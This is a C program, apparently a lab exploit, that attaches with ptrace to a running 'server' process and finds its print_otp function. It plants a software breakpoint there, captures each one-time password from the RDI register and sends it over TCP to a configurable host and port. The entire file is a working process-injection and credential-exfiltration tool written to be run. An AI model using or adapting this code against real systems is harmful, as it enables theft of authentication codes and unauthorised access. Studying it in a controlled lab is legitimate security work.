#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <inttypes.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

static void die(const char *msg) {
  perror(msg);
  exit(1);
}

static unsigned long read_maps_exe_base(pid_t pid) {
  char path[64];
  snprintf(path, sizeof path, "/proc/%d/maps", pid);

  FILE *f = fopen(path, "r");
  if (!f) die("fopen maps");

  char line[512];
  unsigned long base = 0;
  while (fgets(line, sizeof line, f)) {
    unsigned long s, e;
    char perms[8];
    if (sscanf(line, "%lx-%lx %7s", &s, &e, perms) != 3) continue;
    if (strncmp(perms, "r-xp", 4) != 0) continue;
    // we only care about the server text mapping.
    if (!strstr(line, "/server")) continue;
    base = s;
    break;
  }

  fclose(f);
  if (!base) {
    fprintf(stderr, "Could not find r-xp mapping containing '/server' in /proc/%d/maps\n", pid);
    exit(1);
  }
  return base;
}

static uintptr_t read_print_otp_entry_from_nm(void) {
  FILE *p = popen("nm -p ./server | awk '/ print_otp$/ {print $1; exit}'", "r");
  if (!p) die("popen nm");

  char hex[64];
  if (!fgets(hex, sizeof hex, p)) {
    fprintf(stderr, "Could not parse print_otp from nm. Try: nm -p ./server | grep print_otp\n");
    exit(1);
  }
  pclose(p);

  char *end = NULL;
  unsigned long v = strtoul(hex, &end, 16);
  if (end == hex) {
    fprintf(stderr, "Bad nm output: %s", hex);
    exit(1);
  }
  return (uintptr_t)v;
}

static long peek_word(pid_t pid, uintptr_t aligned_addr) {
  errno = 0;
  long w = ptrace(PTRACE_PEEKDATA, pid, (void *)aligned_addr, NULL);
  if (errno != 0) die("PTRACE_PEEKDATA");
  return w;
}

static void poke_word(pid_t pid, uintptr_t aligned_addr, long w) {
  if (ptrace(PTRACE_POKEDATA, pid, (void *)aligned_addr, (void *)w) == -1)
    die("PTRACE_POKEDATA");
}

static uint8_t read_byte(pid_t pid, uintptr_t addr) {
  // ptrace peek/poke works in word-sized chunks, so we mask to aligned address first.
  uintptr_t a = addr & ~(uintptr_t)7;
  unsigned shift = (unsigned)((addr - a) * 8u);
  long w = peek_word(pid, a);
  return (uint8_t)((unsigned long)w >> shift);
}

static void write_byte(pid_t pid, uintptr_t addr, uint8_t b) {
  uintptr_t a = addr & ~(uintptr_t)7;
  unsigned shift = (unsigned)((addr - a) * 8u);

  long w = peek_word(pid, a);
  unsigned long uw = (unsigned long)w;
  unsigned long mask = ~(0xFFUL << shift);
  uw = (uw & mask) | ((unsigned long)b << shift);
  poke_word(pid, a, (long)uw);
}

static void poke_int3(pid_t pid, uintptr_t addr, uint8_t *saved) {
  *saved = read_byte(pid, addr);
  write_byte(pid, addr, 0xCC);
}

static void restore_byte(pid_t pid, uintptr_t addr, uint8_t saved) {
  write_byte(pid, addr, saved);
}

static void send_otp_tcp(const char *host, uint16_t port, uint32_t otp) {
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  if (fd < 0) die("socket");

  struct sockaddr_in a;
  memset(&a, 0, sizeof a);
  a.sin_family = AF_INET;
  a.sin_port = htons(port);
  if (inet_pton(AF_INET, host, &a.sin_addr) != 1) {
    fprintf(stderr, "bad host: %s\n", host);
    exit(1);
  }

  if (connect(fd, (struct sockaddr *)&a, sizeof a) == -1) die("connect");

  char buf[32];
  // Client expects a 6-digit code and newline.
  int n = snprintf(buf, sizeof buf, "%06u\n", otp);
  if (n <= 0) {
    close(fd);
    return;
  }

  ssize_t off = 0;
  while (off < n) {
    ssize_t w = send(fd, buf + off, (size_t)(n - off), 0);
    if (w < 0) die("send");
    off += w;
  }

  close(fd);
}

int main(int argc, char **argv) {
  if (argc < 2) {
    fprintf(stderr, "usage: %s <server_pid> [host] [port]\n", argv[0]);
    fprintf(stderr, "example: %s 86 127.0.0.1 9001\n", argv[0]);
    return 1;
  }

  pid_t pid = (pid_t)strtol(argv[1], NULL, 10);
  const char *host = (argc >= 3) ? argv[2] : "127.0.0.1";
  uint16_t port = (uint16_t)((argc >= 4) ? strtoul(argv[3], NULL, 10) : 9001);

  uintptr_t sym = read_print_otp_entry_from_nm();
  unsigned long base = read_maps_exe_base(pid);

  /* nm often prints the symbol VA (already includes mapping base). Don't double-add base. */
  uintptr_t sym_va = sym;
  if (sym < (uintptr_t)base) sym_va = (uintptr_t)base + sym;

  /* GDB showed stops at print_otp+15 with rip == 0x401345 on this lab binary. */
  const uintptr_t kHitInsideOffset = 15;
  uintptr_t bp = sym_va + kHitInsideOffset;

  fprintf(stderr, "[*] maps exe base = 0x%lx\n", base);
  fprintf(stderr, "[*] nm print_otp entry = 0x%" PRIxPTR "\n", sym);
  fprintf(stderr, "[*] resolved print_otp VA = 0x%" PRIxPTR "\n", sym_va);
  fprintf(stderr, "[*] breakpoint VA = 0x%" PRIxPTR " (entry + %zu)\n", bp,
          (size_t)kHitInsideOffset);

  // Attach to the already-running server process.
  if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) die("PTRACE_ATTACH");

  int status = 0;
  if (waitpid(pid, &status, 0) == -1) die("waitpid after attach");

  uint8_t saved = 0;
  // Arm breakpoint once; then we keep re-arming it after each single-step.
  poke_int3(pid, bp, &saved);

  for (;;) {
    if (ptrace(PTRACE_CONT, pid, NULL, NULL) == -1) die("PTRACE_CONT");
    if (waitpid(pid, &status, 0) == -1) die("waitpid");

    if (WIFEXITED(status) || WIFSIGNALED(status)) {
      fprintf(stderr, "[*] tracee ended\n");
      break;
    }

    if (!WIFSTOPPED(status)) continue;

    int sig = WSTOPSIG(status);
    if (sig != SIGTRAP) {
      if (ptrace(PTRACE_CONT, pid, NULL, (void *)(long)sig) == -1)
        die("PTRACE_CONT (forward signal)");
      continue;
    }

    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) die("PTRACE_GETREGS");

    // print_otp(otp): first integer arg is in RDI on x86_64 SysV ABI.
    uint32_t otp = (uint32_t)(regs.rdi & 0xffffffffu);
    send_otp_tcp(host, port, otp);

    restore_byte(pid, bp, saved);

    /* Linux/x86_64 debug trap: RIP often points after the INT3. */
    if (regs.rip == (unsigned long long)bp + 1) {
      regs.rip = (unsigned long long)bp;
    } else if (regs.rip != (unsigned long long)bp) {
      regs.rip = (unsigned long long)bp;
    }

    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) die("PTRACE_SETREGS");

    // Execute exactly one original instruction at bp before re-inserting INT3.
    if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) == -1) die("PTRACE_SINGLESTEP");
    if (waitpid(pid, &status, 0) == -1) die("waitpid after step");

    poke_int3(pid, bp, &saved);
  }

  return 0;
}
